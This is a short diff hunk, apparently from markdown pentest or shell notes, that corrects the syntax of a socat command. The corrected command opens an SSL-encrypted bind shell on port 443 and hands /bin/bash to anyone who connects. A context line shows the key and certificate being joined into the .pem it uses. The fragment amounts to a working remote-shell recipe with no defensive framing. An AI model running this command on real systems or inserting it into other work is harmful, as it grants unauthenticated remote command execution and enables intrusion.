@@ -208,5 +208,5 @@ cat bind_shell.key bind_shell.crt > bind_shell.pem
 
 - Listening using SSL
 ```bash
-sudo socat OPENSSL-LISTEN:443,cert-bind_shell.pem, verify=0,fork EXEC:/bin/bash
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem, verify=0,fork EXEC:/bin/bash
 ```
